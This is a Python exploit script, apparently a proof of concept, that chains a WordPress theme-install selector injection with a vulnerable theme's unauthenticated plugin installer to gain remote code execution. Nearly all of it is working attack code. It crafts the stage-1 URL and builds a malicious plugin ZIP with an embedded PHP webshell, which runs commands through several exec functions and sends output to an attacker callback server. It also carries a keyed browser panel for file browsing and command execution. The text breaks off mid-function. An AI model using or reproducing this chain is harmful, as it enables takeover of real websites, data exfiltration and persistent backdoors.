#!/usr/bin/env python3
"""
Click2Shell-PoC.py — Click2Shell Proof-of-Concept — Whitebox Pentesting
=========================================================
Whitebox pentesting tool. Authorized use ONLY on assets you own.

Based on pwn.ai research: https://pwn.ai/blog/click2shell
(WordPress 7.1.1 maintenance & security release, 2026-09-17)

Chain (pwn.ai-faithful):
  STAGE 1 — preauth forced theme install (Core jQuery selector injection):
    /wp-admin/theme-install.php?theme=SLUG"]>*>*>*/*
    - Themes API canonicalizes value -> real catalog slug (legit record)
    - theme.js reuses the RAW value in a jQuery selector (unescaped):
        $('div[data-slug="' + slug + '"]').trigger('click')
    - injected quote + child combinators + CSS comment walk INTO the
      genuine Install control -> WordPress clicks Install for the admin.
    - no nonce needed (trusted admin page supplies it), no attacker
      WP account needed.
  STAGE 2 — pre-activation RCE via vulnerable catalog theme:
    /wp-admin/admin-ajax.php?wp_customize=on&customize_theme=THEME
    loads the inactive theme's PHP (functions.php) during Customizer
    preview. The then-current Mobile Repair Zone 2.5.4 package
    registers an AJAX installer WITHOUT nonce/capability check:
        wp_ajax_mobile_repair_zone_install_and_activate_plugin
    which fetches an attacker-selected plugin package URL, unpacks
    it, and includes the chosen plugin file -> PHP execution as the
    WP server user.

    The site's active theme never changes. Nothing suspicious shows
    in the UI: the theme sits installed but inactive.

Affected: all WordPress < 7.1.1 (core fix: changeset 63664,
$.escapeSelector + div.theme constraint).
Chain impact requires a vulnerable pre-activation theme (MRZ 2.5.4
+ 40 third-party themes per pwn.ai).

Modes:
    --scan     version + core-fix + theme probes (read-only)
    --exploit  generate stage-1 crafted URL (+ negative control) and
               upload the bait page to the persistent bait server
    --rce      full chain: stage-2 auto-submit with plugin ZIP served
               by the bait server (requires --exploit state)
    --wait N   poll the bait server for RCE callbacks for N seconds

Persistent bait server (same infra as XSS2Shell):
    https://REPLACE-WITH-PUBLIC-IP.sslip.io/c2s-bait   bait page (victim loads)
    .../c2s-zip        plugin ZIP (victim's PHP fetches)
    .../c2s-callback   RCE exfil endpoint (writes JSONL)
    .../c2s-update     token-authed push (this script uses it)
    .../c2s-status     token-authed capture polling

Token: /root/.x2s_token (or --token / $C2S_TOKEN).

Exit codes: 0 = not vulnerable / clean / timeout-no-capture,
            1 = operational error,
            2 = vulnerability or RCE confirmed

Requirements: pip install requests beautifulsoup4
"""

import argparse
import base64
import io
import re
import secrets
import sys
import time
import uuid
import zipfile
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

import requests

UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36')

# ── Hard denylist — never target these (not our assets) ─────────────
DENYLIST = []

DEFAULT_BAIT = 'https://REPLACE-WITH-PUBLIC-IP.sslip.io'
TOKEN_FILE = Path('/root/.x2s_token')

BANNER = """
  ░██████  ░██ ░██           ░██        ░██████    ░██████   ░██                   ░██ ░██ 
 ░██   ░██ ░██               ░██       ░██   ░██  ░██   ░██  ░██                   ░██ ░██ 
░██        ░██ ░██ ░███████  ░██    ░██      ░██ ░██         ░████████   ░███████  ░██ ░██ 
░██        ░██ ░██░██    ░██ ░██   ░██   ░█████   ░████████  ░██    ░██ ░██    ░██ ░██ ░██ 
░██        ░██ ░██░██        ░███████   ░██              ░██ ░██    ░██ ░█████████ ░██ ░██ 
 ░██   ░██ ░██ ░██░██    ░██ ░██   ░██ ░██        ░██   ░██  ░██    ░██ ░██        ░██ ░██ 
  ░██████  ░██ ░██ ░███████  ░██    ░██░████████   ░██████   ░██    ░██  ░███████  ░██ ░██
"""

SUBBANNER = """  Click2Shell: Preauth WP Core Theme Preview Injection -> RCE chain
  ref: https://pwn.ai/blog/click2shell   |   fix: WP 7.1.1 (changeset 63664)
  Whitebox pentest — authorized assets only.
"""


def log(msg: str) -> None:
    print(f"[*] {datetime.now().strftime('%H:%M:%S')} {msg}", flush=True)


def derive_ajax_action(theme: str) -> str:
    """Derive stage-2 AJAX action from theme slug (WP convention:
    wp_ajax_<theme_underscored>_install_and_activate_plugin).
    e.g. 'mobile-repair-zone' -> 'mobile_repair_zone_install_and_activate_plugin'
         'twentytwenty'       -> 'twentytwenty_install_and_activate_plugin'"""
    return theme.replace('-', '_') + '_install_and_activate_plugin'


def die(msg: str, code: int = 1) -> None:
    print(f"[!] {msg}", flush=True)
    sys.exit(code)


def load_token(cli_token: str) -> str:
    import os
    tok = cli_token or os.environ.get('C2S_TOKEN', '')
    if not tok:
        try:
            tok = TOKEN_FILE.read_text().strip()
        except OSError:
            pass
    return tok


def norm(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def check_denylist(url: str) -> None:
    host = url.split('/')[2] if '//' in url else url
    for bad in DENYLIST:
        if host == bad or host.endswith('.' + bad):
            die(f"TARGET {host} IS ON THE HARD DENYLIST. Aborting.", 1)


def session() -> requests.Session:
    s = requests.Session()
    s.headers['User-Agent'] = UA
    s.verify = True
    return s


# ── Probes (read-only) ───────────────────────────────────────────────

def _ver_from_assets(html: str) -> str:
    """WordPress version from ?ver= asset params (works when the
    generator meta tag is hidden). Only trust ver= on WP core
    assets (wp-includes / wp-content / wp-admin) to avoid app
    version noise."""
    cands = re.findall(
        r'(?:wp-includes|wp-content|wp-admin)[^"\']*'
        r'\?ver=(\d+\.\d+(?:\.\d+)?)', html)
    if not cands:
        return ''
    # most-frequent version among core assets wins
    return max(set(cands), key=cands.count)


def probe_version(s: requests.Session, target: str) -> str:
    """Multi-signal WP version detection:
    1) <meta name="generator"> on home / wp-login.php
    2) ?ver= params on core assets (home / wp-login.php)
    3) readme.html (WordPress X.Y.Z)
    """
    pages = (target, target + '/wp-login.php')
    for p in pages:
        try:
            r = s.get(p, timeout=20, allow_redirects=True)
        except requests.RequestException:
            continue
        m = re.search(r'name="generator" content="WordPress ([\d.]+)"',
                      r.text)
        if m:
            return m.group(1)
    for p in pages:
        try:
            r = s.get(p, timeout=20, allow_redirects=True)
        except requests.RequestException:
            continue
        v = _ver_from_assets(r.text)
        if v:
            return v
    try:
        r = s.get(target + '/readme.html', timeout=20)
        m = re.search(r'WordPress ([\d.]+)', r.text)
        if m:
            return m.group(1)
    except requests.RequestException as exc:
        log(f"version probe failed: {exc}")
    return 'unknown'


def probe_core_fix(s: requests.Session, target: str) -> dict:
    """Check theme.js: vulnerable raw selector vs escapeSelector fix."""
    out = {'checked': False, 'fixed': None, 'detail': ''}
    for path in ('/wp-admin/js/theme.js', '/wp-admin/js/theme.min.js'):
        try:
            r = s.get(target + path, timeout=20)
        except requests.RequestException:
            continue
        if r.status_code != 200 or 'slug' not in r.text:
            continue
        out['checked'] = True
        out['detail'] = path
        if 'escapeSelector' in r.text:
            out['fixed'] = True
        elif 'data-slug="' in r.text:
            out['fixed'] = False
        break
    return out


def probe_theme(s: requests.Session, target: str,
                theme: str) -> dict:
    """Detect installed theme. Robust vs soft-404 hosts (HTTP 200 +
    'Page not found' HTML) — a real style.css always carries the
    theme header comment 'Theme Name:'."""
    out = {'installed': False, 'version': ''}
    try:
        r = s.get(f"{target}/wp-content/themes/{theme}/style.css",
                  timeout=20, allow_redirects=True)
        head = r.text.lower()[:400]
        is_theme = ('theme name:' in head) or \
            (head.lstrip().startswith('/*') and 'page not found' not in head)
        if r.status_code == 200 and is_theme:
            m = re.search(r'^\s*version:\s*([\d.]+)', head, re.M)
            out['version'] = m.group(1) if m else ''
            out['installed'] = True
    except requests.RequestException:
        pass
    return out


def stage1_url(target: str, theme: str) -> tuple:
    route_value = theme + '"]>*>*>*/*'
    crafted = (f"{target}/wp-admin/theme-install.php?theme="
               + quote(route_value, safe=''))
    negative = (f"{target}/wp-admin/theme-install.php?theme="
                + quote(theme, safe=''))
    return crafted, negative


# ── Advanced webshell panel (injected into the plugin PHP) ───────────
# Dashboard: system + WordPress info, file manager (permission/owner/
# size/mtime), file viewer, stat detail, command execution. Only
# reachable with a valid c2s_k key; keyless requests keep the legacy
# exfil-only behaviour (marker + exfil to bait server).

_C2S_HELPERS_PHP = r'''
function _c2s_hsize($n) {
    $n = (int)$n;
    $u = array('B', 'K', 'M', 'G', 'T', 'P');
    $i = 0;
    while ($n >= 1024 && $i < count($u) - 1) { $n /= 1024; $i++; }
    return number_format($n, $i ? 1 : 0) . ' ' . $u[$i];
}
function _c2s_rwx($mode) {
    $map = array('---', '-wx', '-w-', 'r-x', '--x', 'rw-', 'r-x', 'rwx');
    $s = $map[($mode & 0700) >> 6] . $map[($mode & 0070) >> 3] . $map[$mode & 0007];
    if ($mode & 04000) $s[2] = ($mode & 0100) ? 's' : 'S';
    if ($mode & 02000) $s[5] = ($mode & 0010) ? 's' : 'S';
    if ($mode & 01000) $s[8] = ($mode & 0001) ? 't' : 'T';
    $ft = $mode & 0170000;
    $t = $ft === 0040000 ? 'd' : ($ft === 0120000 ? 'l' : ($ft === 0140000 ? 's' : ($ft === 0060000 ? 'b' : ($ft === 0020000 ? 'c' : '-'))));
    return $t . $s;
}
function _c2s_ug($full) {
    $uid = @fileowner($full);
    $gid = @filegroup($full);
    $un = $uid === false ? '?' : (string)$uid;
    $gn = $gid === false ? '?' : (string)$gid;
    if ($uid !== false && function_exists('posix_getpwuid')) {
        $pw = @posix_getpwuid($uid);
        if (is_array($pw) && isset($pw['name'])) $un = $pw['name'] . ' (' . $uid . ')';
    }
    if ($gid !== false && function_exists('posix_getgrgid')) {
        $gr = @posix_getgrgid($gid);
        if (is_array($gr) && isset($gr['name'])) $gn = $gr['name'] . ' (' . $gid . ')';
    }
    return array($un, $gn);
}
function _c2s_container() {
    $sig = array();
    if (file_exists('/.dockerenv')) $sig[] = '/.dockerenv';
    if (file_exists('/run/.containerenv')) $sig[] = 'podman(/run/.containerenv)';
    if (is_readable('/proc/1/cgroup')) {
        $cg = (string)@file_get_contents('/proc/1/cgroup');
        if (preg_match('/(docker|kubepods|containerd|lxc)/', $cg, $m)) $sig[] = 'cgroup:' . $m[1];
    }
    $host = (string)@gethostname();
    if (preg_match('/^[0-9a-f]{12}$/i', $host)) $sig[] = 'hostname=' . $host . ' (12-hex = container id)';
    $ctx = '';
    if (is_readable('/proc/1/cmdline')) {
        $c1 = trim(str_replace(chr(0), ' ', (string)@file_get_contents('/proc/1/cmdline')));
        if ($c1 !== '' && strlen($c1) < 120) $ctx = ' | pid1: ' . $c1;
    }
    return ($sig ? 'YA (container) — ' . implode(', ', $sig)
                 : 'TIDAK terdeteksi (kemungkinan bare metal / VM)') . $ctx;
}
function _c2s_sysinfo() {
    $rows = array();
    $rows['hostname'] = (string)@gethostname();
    if (function_exists('php_uname')) $rows['os/uname'] = (string)@php_uname('a');
    $rows['user'] = (function_exists('get_current_user') ? get_current_user() : '?');
    $rows['uid/gid'] = (function_exists('posix_geteuid') ? posix_geteuid() : '?') . ' / ' . (function_exists('posix_getegid') ? posix_getegid() : '?');
    $rows['php_version'] = PHP_VERSION;
    $rows['php_sapi'] = php_sapi_name();
    $rows['disable_functions'] = (string)@ini_get('disable_functions') ?: '(kosong)';
    $rows['web_server'] = (isset($_SERVER['SERVER_SOFTWARE']) && $_SERVER['SERVER_SOFTWARE'] !== '') ? (string)$_SERVER['SERVER_SOFTWARE'] : 'n/a';
    $rows['server_addr'] = (isset($_SERVER['SERVER_ADDR']) ? (string)$_SERVER['SERVER_ADDR'] : '?') . ':' . (isset($_SERVER['SERVER_PORT']) ? (string)$_SERVER['SERVER_PORT'] : '?');
    $rows['client_ip (browser)'] = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : 'n/a';
    $rows['document_root'] = (string)@getenv('DOCUMENT_ROOT') ?: 'n/a';
    $rows['date_time'] = date('Y-m-d H:i:s T (UTC' . date('P') . ')');
    if (function_exists('shell_exec')) {
        $up = trim((string)@shell_exec('uptime 2>/dev/null | head -1'));
        if ($up !== '') $rows['uptime'] = $up;
        $df = trim((string)@shell_exec('df -h / 2>/dev/null | tail -1'));
        if ($df !== '') $rows['disk /'] = $df;
        $fr = trim((string)@shell_exec('free -h 2>/dev/null | sed -n 2p'));
        if ($fr !== '') $rows['memory'] = $fr;
    }
    $rows['container'] = _c2s_container();
    return $rows;
}
function _c2s_wpinfo($root) {
    $rows = array();
    $rows['abspath'] = $root;
    $rows['wp_config'] = is_file($root . '/wp-config.php') ? 'ada (wp-config.php)' : 'TIDAK ada wp-config.php';
    $vp = $root . '/wp-includes/version.php';
    if (is_file($vp)) {
        $src = (string)@file_get_contents($vp);
        if (preg_match("/wp_version\s*=\s*'([^']+)'/", $src, $m)) $rows['wp_version'] = $m[1];
        else $rows['wp_version'] = 'gagal parse ' . $vp;
        if (preg_match('/wp_db_version\s*=\s*(\d+)/', $src, $m)) $rows['wp_db_version'] = $m[1];
    } else {
        $rows['wp_version'] = 'TIDAK ditemukan (' . $vp . ')';
    }
    $themes = array();
    if (is_dir($root . '/wp-content/themes')) {
        foreach (scandir($root . '/wp-content/themes') as $t) if ($t !== '.' && $t !== '..') $themes[] = $t;
    }
    sort($themes);
    $rows['themes (' . count($themes) . ')'] = $themes ? implode(', ', $themes) : 'n/a';
    $pllist = array();
    if (is_dir($root . '/wp-content/plugins')) {
        foreach (scandir($root . '/wp-content/plugins') as $p) if ($p !== '.' && $p !== '..') $pllist[] = $p;
    }
    sort($pllist);
    $rows['plugins (' . count($pllist) . ')'] = $pllist ? implode(', ', $pllist) : 'n/a';
    return $rows;
}
function _c2s_ls($path) {
    if ($path === '') $path = '/';
    if (!is_dir($path)) return array('err' => 'bukan direktori: ' . $path);
    $items = @scandir($path);
    if ($items === false) return array('err' => 'scandir gagal (permission denied?)');
    sort($items);
    $rows = array();
    foreach ($items as $n) {
        if ($n === '.' || $n === '..') continue;
        $full = ($path === '/' ? '' : rtrim($path, '/') . '/') . $n;
        $st = @lstat($full);
        if (!$st) {
            $rows[] = array('name' => $n, 'full' => $full, 'perm' => '?????????', 'own' => '?', 'grp' => '?', 'sz' => '?', 'mt' => '?', 'dir' => false);
            continue;
        }
        list($un, $gn) = _c2s_ug($full);
        $rows[] = array(
            'name' => $n,
            'full' => $full,
            'perm' => _c2s_rwx($st['mode']),
            'own' => $un,
            'grp' => $gn,
            'sz' => ($st['mode'] & 0170000) === 0040000 ? '-' : _c2s_hsize($st['size']),
            'mt' => date('Y-m-d H:i:s', $st['mtime']),
            'dir' => ($st['mode'] & 0170000) === 0040000,
        );
    }
    return $rows;
}
function _c2s_view($path) {
    if (!file_exists($path)) return array('err' => 'tidak ada: ' . $path);
    if (!is_file($path)) return array('err' => 'bukan file reguler: ' . $path);
    $st = @stat($path);
    $head = @file_get_contents($path, false, null, 0, 4096);
    $head = $head === false ? '' : (string)$head;
    $bin = strpos($head, "\0") !== false;
    return array(
        'size' => (int)$st['size'],
        'octal' => '0' . substr(decoct($st['mode']), -4),
        'bin' => $bin,
        'head' => $head,
        'data' => $bin ? '' : (string)@file_get_contents($path, false, null, 0, 65536),
    );
}
function _c2s_statrows($full) {
    $st = @lstat($full);
    if (!$st) return array('err' => 'stat/lstat gagal: ' . $full);
    list($un, $gn) = _c2s_ug($full);
    $ft = $st['mode'] & 0170000;
    $rows = array();
    $rows['path'] = $full;
    $rows['type'] = $ft === 0040000 ? 'directory' : ($ft === 0120000 ? 'symlink' : ($ft === 0140000 ? 'socket' : ($ft === 0060000 ? 'block-device' : ($ft === 0020000 ? 'char-device' : 'regular-file'))));
    $rows['mode_octal'] = '0' . substr(decoct($st['mode']), -4);
    $rows['perms_rwx'] = _c2s_rwx($st['mode']);
    $rows['owner'] = $un;
    $rows['group'] = $gn;
    $rows['size_bytes'] = number_format($st['size']);
    $rows['size_human'] = _c2s_hsize($st['size']);
    $rows['inode'] = (string)$st['ino'];
    $rows['links'] = (string)$st['nlink'];
    $rows['atime'] = date('Y-m-d H:i:s T', $st['atime']);
    $rows['mtime'] = date('Y-m-d H:i:s T', $st['mtime']);
    $rows['ctime'] = date('Y-m-d H:i:s T', $st['ctime']);
    if (PHP_VERSION_ID >= 80100 && !empty($st['btime'])) $rows['birth'] = date('Y-m-d H:i:s T', $st['btime']);
    return $rows;
}
'''

_C2S_INTERACTIVE_PHP = r'''
$c2s_key = '@@KEY@@';
if ($c2s_key !== '' && isset($_GET['c2s_k']) && hash_equals($c2s_key, (string)$_GET['c2s_k'])) {
    if (isset($_GET['c']) && trim((string)$_GET['c']) !== '') {
        $c2s_ic = (string)$_GET['c'];
        $c2s_ir = _c2s_run($c2s_ic . ' 2>&1');
        @header('Content-Type: text/plain; charset=utf-8');
        echo 'c2s interactive | ' . _c2s_diag() . "\n";
        echo 'CMD> ' . $c2s_ic . "\n";
        echo ($c2s_ir === null ? 'EXEC-BLOCKED: ' . _c2s_diag() : $c2s_ir) . "\n";
        echo '-- end --' . "\n";
        return;
    }
    @header('Content-Type: text/html; charset=utf-8');
    $c2s_wp = dirname(dirname(dirname(dirname(__FILE__))));
    $c2s_m  = isset($_GET['m']) ? (string)$_GET['m'] : '';
    $c2s_p  = isset($_GET['path']) && trim((string)$_GET['path']) !== '' ? (string)$_GET['path'] : $c2s_wp;
    $c2s_h  = function ($x) { return htmlspecialchars((string)$x, ENT_QUOTES, 'UTF-8'); };
    $c2s_u  = function ($x) { return rawurlencode((string)$x); };
    $c2s_ref = 'c2s_k=' . $c2s_u($c2s_key);
    echo '<!doctype html><title>c2s panel</title>';
    echo '<meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<body style="font:13px/1.45 monospace;background:#0d1117;color:#c9d1d9;padding:12px;margin:0">';
    echo '<h3 style="color:#58a6ff;margin:0 0 4px">c2s panel</h3>';
    echo '<pre style="color:#8b949e;margin:0 0 10px">' . $c2s_h(_c2s_diag()) . '</pre>';
    echo '<h4 style="color:#39d353">SYSTEM</h4>';
    echo '<table border=0 cellpadding=3 style="border-collapse:collapse">';
    foreach (_c2s_sysinfo() as $c2s_k2 => $c2s_v2) {
        echo '<tr><td style="color:#8b949e;white-space:nowrap;padding-right:12px;vertical-align:top">' . $c2s_h($c2s_k2) . '</td><td style="white-space:pre-wrap">' . $c2s_h($c2s_v2) . '</td></tr>';
    }
    echo '</table>';
    echo '<h4 style="color:#39d353">WORDPRESS</h4>';
    echo '<table border=0 cellpadding=3 style="border-collapse:collapse">';
    foreach (_c2s_wpinfo($c2s_wp) as $c2s_k2 => $c2s_v2) {
        echo '<tr><td style="color:#8b949e;white-space:nowrap;padding-right:12px;vertical-align:top">' . $c2s_h($c2s_k2) . '</td><td style="white-space:pre-wrap">' . $c2s_h($c2s_v2) . '</td></tr>';
    }
    echo '</table>';
    if ($c2s_m === 'ls') {
        $c2s_res = _c2s_ls($c2s_p);
        if (isset($c2s_res['err'])) {
            echo '<pre style="color:#f85149">LS ERROR: ' . $c2s_h($c2s_res['err']) . '</pre>';
        } else {
            $c2s_d = rtrim($c2s_p, '/');
            if ($c2s_d !== '') {
                $c2s_up = dirname($c2s_d);
                $c2s_up = $c2s_up === '' ? '/' : $c2s_up;
                echo '<h4 style="color:#39d353">DIR: ' . $c2s_h($c2s_d) . ' (' . count($c2s_res) . ' entries)</h4>';
                echo '<p><a href="?' . $c2s_ref . '&amp;m=ls&amp;path=' . $c2s_u($c2s_up) . '" style="color:#58a6ff">../ ' . $c2s_h($c2s_up) . '</a></p>';
            } else {
                echo '<h4 style="color:#39d353">DIR: / (' . count($c2s_res) . ' entries)</h4>';
            }
            echo '<table border=0 cellpadding=2 style="border-collapse:collapse;font-size:12px">';
            echo '<tr style="color:#8b949e"><th style="text-align:left">perm</th><th style="text-align:left">owner</th><th style="text-align:left">group</th><th style="text-align:right">size</th><th style="text-align:left">mtime</th><th style="text-align:left">name</th></tr>';
            foreach ($c2s_res as $c2s_r) {
                $c2s_nm = $c2s_h($c2s_r['name']);
                $c2s_lnk = '<a href="?' . $c2s_ref . '&amp;m=' . ($c2s_r['dir'] ? 'ls' : 'view') . '&amp;path=' . $c2s_u($c2s_r['full']) . '" style="color:' . ($c2s_r['dir'] ? '#58a6ff' : '#c9d1d9') . '">' . $c2s_nm . '</a>' . ($c2s_r['dir'] ? ' /' : '');
                echo '<tr><td style="color:#8b949e">' . $c2s_h($c2s_r['perm']) . '</td><td style="white-space:nowrap">' . $c2s_h($c2s_r['own']) . '</td><td style="white-space:nowrap">' . $c2s_h($c2s_r['grp']) . '</td><td style="text-align:right">' . $c2s_h($c2s_r['sz']) . '</td><td style="color:#8b949e;white-space:nowrap">' . $c2s_h($c2s_r['mt']) . '</td><td>' . $c2s_lnk . '</td></tr>';
            }
            echo '</table>';
        }
    } elseif ($c2s_m === 'view') {
        $c2s_res = _c2s_view($c2s_p);
        if (isset($c2s_res['err'])) {
            echo '<pre style="color:#f85149">VIEW ERROR: ' . $c2s_h($c2s_res['err']) . '</pre>';
        } else {
            echo '<h4 style="color:#39d353">FILE: ' . $c2s_h($c2s_p) . ' (' . $c2s_h(_c2s_hsize($c2s_res['size'])) . ', mode ' . $c2s_h($c2s_res['octal']) . ')</h4>';
            $c2s_pd = dirname($c2s_p);
            if ($c2s_pd === '') $c2s_pd = '.';
            echo '<p><a href="?' . $c2s_ref . '&amp;m=stat&amp;path=' . $c2s_u($c2s_p) . '" style="color:#58a6ff">stat detail</a> | <a href="?' . $c2s_ref . '&amp;m=ls&amp;path=' . $c2s_u($c2s_pd) . '" style="color:#58a6ff">back to dir</a></p>';
            if ($c2s_res['bin']) {
                echo '<pre style="color:#f85149">[binary file]</pre>';
                $c2s_hx = '';
                for ($c2s_i = 0; $c2s_i < min(128, strlen($c2s_res['head'])); $c2s_i += 16) {
                    $c2s_hx .= dechex($c2s_i) . ': ' . bin2hex(substr($c2s_res['head'], $c2s_i, 16)) . "\n";
                }
                echo '<pre style="color:#8b949e">' . $c2s_h($c2s_hx) . '</pre>';
            } else {
                $c2s_data = $c2s_res['data'];
                if ($c2s_res['size'] > 65536) $c2s_data .= "\n\n...TRUNC (64KB dari " . $c2s_h(_c2s_hsize($c2s_res['size'])) . ")";
                echo '<pre style="background:#161b22;padding:8px;white-space:pre-wrap;word-break:break-all">' . $c2s_h($c2s_data) . '</pre>';
            }
        }
    } elseif ($c2s_m === 'stat') {
        $c2s_res = _c2s_statrows($c2s_p);
        if (isset($c2s_res['err'])) {
            echo '<pre style="color:#f85149">STAT ERROR: ' . $c2s_h($c2s_res['err']) . '</pre>';
        } else {
            echo '<h4 style="color:#39d353">STAT</h4>';
            echo '<table border=0 cellpadding=3 style="border-collapse:collapse">';
            foreach ($c2s_res as $c2s_k2 => $c2s_v2) {
                echo '<tr><td style="color:#8b949e;white-space:nowrap;padding-right:12px;vertical-align:top">' . $c2s_h($c2s_k2) . '</td><td style="white-space:pre-wrap">' . $c2s_h($c2s_v2) . '</td></tr>';
            }
            echo '</table>';
        }
    }
    echo '<h4 style="color:#39d353">COMMAND</h4>';
    echo '<form method="get"><input name="c2s_k" value="' . $c2s_h($c2s_key) . '" readonly> <input name="c" placeholder="command, e.g. id" size=40 autofocus> <button>run</button></form>';
    echo '<h4 style="color:#39d353">FILE MANAGER</h4>';
    echo '<form method="get"><input name="c2s_k" value="' . $c2s_h($c2s_key) . '" readonly> <input name="m" value="ls" type="hidden"> <input name="path" value="' . $c2s_h($c2s_p) . '" size=48> <button>list</button></form>';
    echo '<p style="color:#8b949e">hint: ?c2s_k=***&lt;urlencoded command&gt; untuk output langsung (text/plain)</p>';
    echo '</body>';
    return;
}
'''


# ── Plugin ZIP builder ───────────────────────────────────────────────

def build_plugin_zip(slug: str, callback_base: str, cmd: str = '',
                     shell_key: str = '') -> bytes:
    """Webshell plugin: exfils proof-of-execution to the bait server.
    Also exfils a live execution-capability diagnostic (shell_exec/exec/
    system/passthru/popen/proc_open/backticks + disable_functions) so a
    'RCE captured but output empty' result can be explained remotely.

    cmd: optional shell command (e.g. 'id') — executed on the target and
    its output exfils as type c2s_cmd so --wait can print the result.

    shell_key: if set, the file also acts as an interactive panel —
    ?c2s_k=<key> opens the dashboard (system + WordPress info, file
    manager, viewer, stat, command form); ?c=<command> gives plain-text
    command output in the browser. Keyless requests behave exactly
    as before.
    """
    cmd_part = ''
    if cmd:
        # shell-quote the command for PHP double-quoted string context
        cmd_q = cmd.replace('\\', '\\\\').replace('"', '\\"')
        cmd_part = (
            "$c2s_cmdout = _c2s_run('" + cmd_q + " 2>&1');\n"
            "if ($c2s_cmdout === null) {\n"
            "    $c2s_cmdout = 'EXEC-BLOCKED: no execution method available ' .\n"
            "                 '(disable_functions: ' . (string)@ini_get('disable_functions') . ')';\n"
            "}\n"
            "_c2s_exfil('c2s_cmd', $c2s_cmdout);\n"
        )
    # Optional interactive mode (browser-accessible), unlocked by c2s_k key.
    # Placed after all helper fns are defined and BEFORE the exfil block so a
    # keyed request returns early with in-browser output (no exfil noise).
    # Optional interactive panel (browser-accessible), unlocked by c2s_k key.
    # Dashboard: system + WordPress info, file manager (perm/owner/size/mtime),
    # file viewer, stat detail, command execution. Keyless requests behave
    # exactly as before (exfil-only + marker).
    interactive_part = _C2S_INTERACTIVE_PHP.replace('@@KEY@@', shell_key)
    php = (
        "<?php\n"
        "// Click2Shell pre-activation RCE proof (whitebox test asset)\n"
        "$cb = '" + callback_base + "/c2s-callback';\n"
        "function _c2s_exfil($t, $data) {\n"
        "    $data = (string)$data;\n"
        "    if (strlen($data) > 8192) { $data = substr($data, 0, 8192) . '...TRUNC'; }\n"
        "    $ok = 0; $how = '';\n"
        "    if (function_exists('curl_init')) {\n"
        "        $ch = curl_init($GLOBALS['cb'] . '?t=' . $t);\n"
        "        curl_setopt_array($ch, array(\n"
        "            CURLOPT_POST => true,\n"
        "            CURLOPT_POSTFIELDS => $data,\n"
        "            CURLOPT_RETURNTRANSFER => true,\n"
        "            CURLOPT_TIMEOUT => 6,\n"
        "            CURLOPT_CONNECTTIMEOUT => 4,\n"
        "            CURLOPT_SSL_VERIFYPEER => false,\n"
        "            CURLOPT_SSL_VERIFYHOST => 0,\n"
        "            CURLOPT_HTTPHEADER => array('Content-Type: text/plain'),\n"
        "        ));\n"
        "        $resp = @curl_exec($ch);\n"
        "        if ($resp !== false && $resp !== null) { $ok = 1; $how = 'curl:' . curl_getinfo($ch, CURLINFO_HTTP_CODE); }\n"
        "        else { $how = 'curl-err:' . curl_error($ch); }\n"
        "        curl_close($ch);\n"
        "    }\n"
        "    if (!$ok && @ini_get('allow_url_fopen')) {\n"
        "        $ctx = stream_context_create(['http' => [\n"
        "            'method' => 'POST',\n"
        "            'header' => 'Content-Type: text/plain',\n"
        "            'content' => $data,\n"
        "            'timeout' => 5,\n"
        "            'ignore_errors' => true,\n"
        "        ]]);\n"
        "        $r = @file_get_contents($GLOBALS['cb'] . '?t=' . $t, false, $ctx);\n"
        "        if ($r !== false) { $ok = 1; $how = 'fopen'; }\n"
        "    }\n"
        "    if (!$ok) { $how = 'curl+file_get_contents FAILED (allow_url_fopen=' . ((string)@ini_get('allow_url_fopen') ?: 'off') . ')';\n"
        "        // fallback: park data on target disk (recoverable via /tmp)\n"
        "        @file_put_contents(sys_get_temp_dir() . '/wp-c2s-dump.txt', $t . ' | ' . $data . \"\\n\", FILE_APPEND | LOCK_EX);\n"
        "    }\n"
        "    if ($t === 'c2s_theme_php') { $GLOBALS['_c2s_last'] = $ok ? $how : $how; }\n"
        "    if (function_exists('error_log')) { @error_log('C2S_EXFIL ' . $t . ' => ' . $how); }\n"
        "}\n"
        "function _c2s_exfil_status($tag) {\n"
        "    _c2s_exfil('c2s_exfil_status', $tag . ' | ' . (isset($GLOBALS['_c2s_last']) ? $GLOBALS['_c2s_last'] : 'n/a')\n"
        "        . ' | allow_url_fopen=' . ((string)@ini_get('allow_url_fopen') ?: 'off')\n"
        "        . ' | curl=' . (function_exists('curl_init') ? 'yes' : 'no')\n"
        "        . ' | sapi=' . php_sapi_name());\n"
        "}\n"
        "function _c2s_has($f) {\n"
        "    return function_exists($f) && !in_array($f, (array)@ini_get('disable_functions'), true);\n"
        "}\n"
        "function _c2s_run($c) {\n"
        "    $m = array();\n"
        "    if (_c2s_has('shell_exec'))  { $m['shell_exec'] = @shell_exec($c); }\n"
        "    if (_c2s_has('exec'))        { $o = array(); @exec($c, $o, $rc); $m['exec'] = (string)implode(chr(10), $o) . ' [rc=' . $rc . ']'; }\n"
        "    if (_c2s_has('system'))      { ob_start(); @system($c); $m['system'] = (string)ob_get_clean(); }\n"
        "    if (_c2s_has('passthru'))    { ob_start(); @passthru($c); $m['passthru'] = (string)ob_get_clean(); }\n"
        "    if (_c2s_has('popen'))       { $p = @popen($c, 'r'); $m['popen'] = $p ? (string)@stream_get_contents($p) : '(open failed)'; if ($p) @pclose($p); }\n"
        "    if (_c2s_has('proc_open'))   { $pd = @proc_open($c, array(array(0, 'pipe'), array(1, 'pipe'), array(2, 'pipe')), $pp); if (is_resource($pd)) { $m['proc_open'] = (string)@stream_get_contents($pp[1]) . (string)@stream_get_contents($pp[2]); foreach ($pp as $fh) { if (is_resource($fh)) @fclose($fh); } @proc_close($pd); } else { $m['proc_open'] = '(spawn failed)'; } }\n"
        "    if (_c2s_has('backtick'))    { $m['backtick'] = (string)@`$c`; }\n"
        "    foreach ($m as $name => $out) {\n"
        "        if (trim((string)$out) !== '') { return $name . ': ' . $out; }\n"
        "    }\n"
        "    return null;\n"
        "}\n"
        "function _c2s_diag() {\n"
        "    $parts = array();\n"
        "    foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec') as $f) {\n"
        "        $parts[] = $f . '=' . (function_exists($f) ? (in_array($f, (array)@ini_get('disable_functions'), true) ? 'disabled' : 'ok') : 'missing');\n"
        "    }\n"
